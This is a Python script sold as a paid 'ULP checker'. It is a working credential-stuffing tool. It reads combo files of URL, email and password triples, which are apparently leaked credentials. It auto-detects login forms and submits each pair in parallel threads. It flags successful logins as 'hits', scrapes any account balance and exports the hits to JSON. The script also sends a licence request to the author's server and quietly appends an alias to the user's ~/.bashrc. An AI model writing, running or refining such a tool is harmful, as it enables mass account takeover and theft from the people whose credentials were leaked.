#!/usr/bin/env python3
"""
T-X TOOLKIT v1.0 – Paid ULP Checker (FINAL FIXED)
Created by Saeka Tojirp
Usage : tx
"""

import os, sys, time, re, json, threading, random, string, hashlib, uuid, shutil
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
init(autoreset=True)

# ---------- GLOBALS ----------
OWNER_SERVER = "https://request-tracker--mitsukitobashi.replit.app"
ALIAS_FILE = os.path.expanduser("~/.bashrc")

R = Fore.RED; G = Fore.GREEN; B = Fore.BLUE; Y = Fore.YELLOW; M = Fore.MAGENTA; C = Fore.CYAN; W = Fore.WHITE
DIM = Style.DIM; BRIGHT = Style.BRIGHT; RES = Style.RESET_ALL
COLOR_LOOP = [Fore.RED, Fore.BLUE, Fore.GREEN]

# ---------- UTILS ----------
def tw(): return shutil.get_terminal_size().columns

def fix_url(url):
    if not url: return url
    if not url.startswith(('http://','https://')): return 'https://'+url
    return url

def extract_form(soup, base_url):
    for form in soup.find_all('form'):
        if form.find('input',{'type':'password'}):
            inputs = {inp.get('name'):inp.get('value','') for inp in form.find_all('input') if inp.get('name')}
            user_field = next((k for k in inputs if 'user' in k or 'login' in k or 'email' in k), None)
            if not user_field:
                for k in inputs:
                    if k not in ('password','pass','pwd','csrf','token','submit'): user_field = k; break
            pass_field = next((k for k in inputs if 'pass' in k), 'password')
            action = urljoin(base_url, form.get('action',''))
            csrf_token = next((v for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
            extra = {k:v for k,v in inputs.items() if k not in (user_field, pass_field) and 'csrf' not in k}
            return {'action':action, 'user_field':user_field, 'pass_field':pass_field, 'csrf_token':csrf_token, 'extra':extra}
    return None

def check_login(url, email, password):
    res = {'link':url, 'email':email, 'pass':password, 'info':'', 'active':False, 'balance':'', 'time':datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 'platform':detect_platform(url)}
    url = fix_url(url)
    s = requests.Session(); s.headers.update({"User-Agent":"Mozilla/5.0"})
    try:
        r = s.get(url, timeout=10, allow_redirects=True)
        soup = BeautifulSoup(r.text,'html.parser')
        form = extract_form(soup, url)
        if not form:
            res['info'] = "No login form"
            return res
        data = {form['user_field']: email, form['pass_field']: password}
        if form['csrf_token']: data['csrf_token'] = form['csrf_token']
        data.update(form['extra'])
        r2 = s.post(form['action'], data=data, timeout=10, allow_redirects=True)
        text = r2.text.lower(); resp_url = r2.url.lower()
        success_kw = ['logout','dashboard','welcome','account','profile','inbox','home','feed','member','my account']
        fail_kw = ['incorrect','invalid','wrong','error','not found','doesn\'t match','does not match','please try again']
        if any(kw in text for kw in success_kw):
            res['active'] = True; res['info'] = f"HTTP {r2.status_code}"
        elif any(kw in text for kw in fail_kw):
            res['active'] = False; res['info'] = "Invalid credentials"
        else:
            if 'login' not in resp_url and 'signin' not in resp_url:
                res['active'] = True; res['info'] = "Redirected"
            else:
                res['active'] = False; res['info'] = "Still on login"
        bal_match = re.search(r'(?:balance|credit)[\s:$]*(\d+\.?\d{0,2})', r2.text, re.I)
        if bal_match: res['balance'] = bal_match.group(1)
    except requests.exceptions.Timeout:
        res['info'] = "Timeout"
    except requests.exceptions.ConnectionError:
        res['info'] = "Connection refused"
    except Exception as e:
        res['info'] = str(e)[:50]
    return res

def detect_platform(url):
    domain = urlparse(url).netloc.lower()
    if 'google' in domain: return 'Google'
    if 'facebook' in domain or 'fb.com' in domain: return 'Facebook'
    if 'instagram' in domain: return 'Instagram'
    if 'twitter' in domain or 'x.com' in domain: return 'Twitter/X'
    if 'netflix' in domain: return 'Netflix'
    if 'spotify' in domain: return 'Spotify'
    if 'amazon' in domain: return 'Amazon'
    if 'linkedin' in domain: return 'LinkedIn'
    if 'github' in domain: return 'GitHub'
    if 'microsoft' in domain or 'live.com' in domain: return 'Microsoft'
    if 'yahoo' in domain: return 'Yahoo'
    if 'discord' in domain: return 'Discord'
    return domain.split('.')[-2].capitalize() if '.' in domain else 'Generic'

# ---------- ANIMATIONS ----------
def spin(text, sec=1.2):
    frm = ['◜','◠','◝','◞','◡','◟']
    end = time.time()+sec; i=0
    while time.time()<end:
        sys.stdout.write(f"\r  {C}{frm[i%6]} {W}{text}{RES}"); sys.stdout.flush()
        time.sleep(0.08); i+=1
    sys.stdout.write("\r"+" "*50+"\r")

def progress(cur, tot, label=""):
    if tot<=0: return
    pct = int((cur/tot)*100)
    filled = int(30*cur/tot)
    bar = f"{G}{'█'*filled}{DIM}{'░'*(30-filled)}{RES}"
    sys.stdout.write(f"\r  {label} |{bar}| {pct}% ({cur}/{tot})")
    sys.stdout.flush()
    if cur==tot: sys.stdout.write("\n")

def center_print(text, color=W):
    w = tw()
    print(f"{color}{text.center(w)}{RES}")

# ---------- AUTHORISATION ----------
def generate_token(name):
    raw = f"{name}-{uuid.uuid4().hex}-{int(time.time())}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()

def send_request(name):
    token = generate_token(name)
    try:
        r = requests.post(f"{OWNER_SERVER}/api/request", json={"name": name, "token": token}, timeout=8)
        if r.status_code == 201:
            return token
    except:
        pass
    return token

def poll_approval(token):
    try:
        r = requests.get(f"{OWNER_SERVER}/api/status/{token}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data['status'] == 'approved': return True
            elif data['status'] == 'declined': return False
        elif r.status_code == 404:
            return None
    except:
        pass
    return None

# ---------- MAIN ----------
def main():
    # Splash screen
    for _ in range(10):
        os.system('clear')
        spin("Loading...", 0.5)
        color = random.choice(COLOR_LOOP)
        center_print("WELCOME TO T-X TOOLKIT", color)
        time.sleep(0.5)

    # Name prompt
    os.system('clear')
    center_print("WHAT SHOULD YOUR NAME BE?", Y)
    name = input(f"  {W}> {RES}").strip()
    if not name: name = "User"

    # Permission request
    os.system('clear')
    center_print("PERMISSION REQUIRED!", R)
    spin("Generating token...", 1.5)
    token = send_request(name)
    center_print(f"YOUR REQUEST TOKEN IS {token}", W)
    center_print("PLEASE ASK THE OWNER TO APPROVE", DIM)

    while True:
        status = poll_approval(token)
        if status is True:
            break
        elif status is False:
            center_print("REQUEST DECLINED!", R)
            sys.exit(0)
        time.sleep(3)

    os.system('clear')
    center_print("ACCESS GRANTED", G)
    time.sleep(1)

    # Package check (silent)
    spin("Checking packages...", 1.5)

    # Main loop
    combo_file = None
    hits = []
    while True:
        os.system('clear')
        w = tw()
        print(f"{G}HI! {name}{RES}  {DIM}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RES}\n")
        # Glitch title
        title = "T-X PAID TOOL"
        glitch_colors = [Fore.RED, Fore.BLUE, Fore.GREEN, Fore.MAGENTA]
        for i,ch in enumerate(title):
            sys.stdout.write(f"{glitch_colors[i%len(glitch_colors)]}{ch}{RES}")
        print("\n")
        menu = [
            "[ 1 ] START CHECKING",
            "[ 2 ] SEE ACCOUNT HITS!",
            "[ 3 ] EXPORT LOGS",
            "[ 4 ] SETUP FILE PATH",
            "[ 5 ] EXIT"
        ]
        for idx,line in enumerate(menu):
            if idx==3 and not combo_file:
                print(f"  {R}{line}{RES}")
            else:
                print(f"  {W}{line}{RES}")

        t = int(time.time()) % 10 // 5
        creator_color = COLOR_LOOP[t]
        print(f"\n  {creator_color}Created{RES} by Saeka Tojirp.", end='')

        try:
            choice = input(f"\n  {W}> {RES}").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if choice=='1':
            if not combo_file:
                print(f"  {R}Please set up the file path first (option 4).{RES}")
                time.sleep(1)
                continue
            os.system('clear')
            spin("Preparing checker...", 3)
            combos = []
            with open(combo_file,'r',encoding='utf-8',errors='ignore') as f:
                for line in f:
                    line=line.strip()
                    if not line or line.startswith('#'): continue
                    sep = '|' if '|' in line else ':'
                    parts = line.split(sep)
                    if len(parts)>=3:
                        combos.append((parts[0].strip(), parts[1].strip(), parts[2].strip()))
            if not combos:
                print(f"  {R}No valid combos in file.{RES}")
                time.sleep(1)
                continue

            results = []; total=len(combos); done=0; active=0; lock=threading.Lock()
            def worker(url,email,passwd):
                nonlocal done,active
                res = check_login(url,email,passwd)
                with lock:
                    results.append(res); done+=1
                    if res['active']: active+=1
                    act_str = f"{G}ACTIVE{RES}" if res['active'] else f"{R}INVALID{RES}"
                    print(f"{res['link'][:28]:28} {res['email'][:23]:23} {res['pass'][:18]:18} {act_str:10} {res.get('platform',''):12} {res['time'][-8:]}")
                    progress(done,total,"Checking")
            with ThreadPoolExecutor(max_workers=10) as ex:
                for url,email,passwd in combos:
                    ex.submit(worker,url,email,passwd)
            print(f"\n  {G}{active}/{total} active.{RES}")
            hits.extend([r for r in results if r['active']])
            time.sleep(1)

        elif choice=='2':
            os.system('clear')
            if not hits:
                print(f"  {Y}No active hits yet.{RES}")
            else:
                page=0; per=5
                while True:
                    os.system('clear')
                    print(f"  {G}ACCOUNT HITS!{RES}  Page {page+1}/{ (len(hits)-1)//per +1 }")
                    for r in hits[page*per:(page+1)*per]:
                        print(f"  {r['email']}:{r['pass']} | {r.get('balance','')}")
                    print(f"\n  {DIM}[N]ext [P]rev [Q]uit{RES}")
                    k = input().strip().lower()
                    if k=='n' and page<(len(hits)-1)//per: page+=1
                    elif k=='p' and page>0: page-=1
                    elif k=='q': break
            time.sleep(0.5)

        elif choice=='3':
            fn = f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(fn,'w') as f: json.dump(hits,f,indent=2)
            print(f"  {G}Exported to {fn}{RES}")
            time.sleep(1)

        elif choice=='4':
            path = input(f"  {W}Enter combo file path: {RES}").strip()
            if os.path.exists(path):
                combo_file = path
                print(f"  {G}File set!{RES}")
            else:
                print(f"  {R}File not found.{RES}")
            time.sleep(1)

        elif choice=='5':
            break

def setup_alias():
    if not os.path.exists(ALIAS_FILE): return
    alias_cmd = "alias tx='python3 ~/tx_toolkit.py'"
    with open(ALIAS_FILE,'r') as f: content = f.read()
    if alias_cmd not in content:
        os.system(f"echo \"{alias_cmd}\" >> {ALIAS_FILE}")

if __name__=="__main__":
    setup_alias()
    main()
